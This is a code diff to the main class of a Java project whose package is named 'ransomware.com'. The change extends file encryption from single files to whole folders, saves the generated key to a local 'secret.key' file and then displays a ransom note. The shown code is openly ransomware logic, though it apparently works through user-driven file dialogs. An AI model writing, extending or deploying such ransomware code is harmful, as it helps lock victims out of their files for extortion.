@@ -2,13 +2,14 @@ package ransomware.com;
 
 import javax.crypto.SecretKey;
 import javax.swing.*;
+import java.io.File;
 
 public class Main {
 
     public static void main(String[] args) {
         try {
             FileSelector fileSelector = new FileSelector();
-            String filePath = fileSelector.selectFile();
+            String filePath = fileSelector.selectFileOrFolder();
 
             if (filePath != null) {
                 int option = JOptionPane.showOptionDialog(null,
@@ -23,10 +24,25 @@ public class Main {
                 FileEncryptor fileEncryptor = new FileEncryptor();
 
                 if (option == 0) {  // Encryption
-                    if (!filePath.endsWith(".encrypted")) {
+                    File selectedFile = new File(filePath);
+
+                    if (selectedFile.isDirectory()) {
+                        // Encrypt all valid files in the directory
+                        fileEncryptor.generateKey();
+                        fileEncryptor.encryptSelectedFileOrFolder(filePath);  // Updated for folder encryption
+
+                        // Save the encryption key
+                        KeyStorage keyStorage = new KeyStorage();
+                        keyStorage.saveKey(fileEncryptor.getSecretKey(), "secret.key");
+
+                        RansomNote ransomNote = new RansomNote();
+                        ransomNote.displayRansomNote();
+                    } else if (!filePath.endsWith(".encrypted")) {
+                        // Encrypt a single file
                         fileEncryptor.generateKey();
                         fileEncryptor.encryptFile(filePath);
 
+                        // Save the encryption key
                         KeyStorage keyStorage = new KeyStorage();
                         keyStorage.saveKey(fileEncryptor.getSecretKey(), "secret.key");
 
